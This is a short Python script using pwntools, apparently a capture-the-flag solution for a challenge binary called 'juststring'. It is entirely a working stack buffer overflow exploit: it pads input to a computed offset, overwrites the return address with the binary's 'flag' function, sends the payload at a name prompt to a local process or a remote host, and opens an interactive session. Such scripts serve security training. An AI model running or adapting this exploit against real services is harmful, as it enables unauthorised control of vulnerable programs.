from pwn import *
import time

binary = context.binary = ELF("./juststring")

domain=None
port=None

if len(sys.argv)>2:
	domain=sys.argv[1]
	port=sys.argv[2]
if domain is None:
	p=process(binary.path)
else:
	p=remote(domain,port)

offset=cyclic_find("caae")
payload=flat(
    offset*"A",
    p64(binary.symbols["flag"])
)
p.sendlineafter("Enter your name:",payload)
p.interactive()
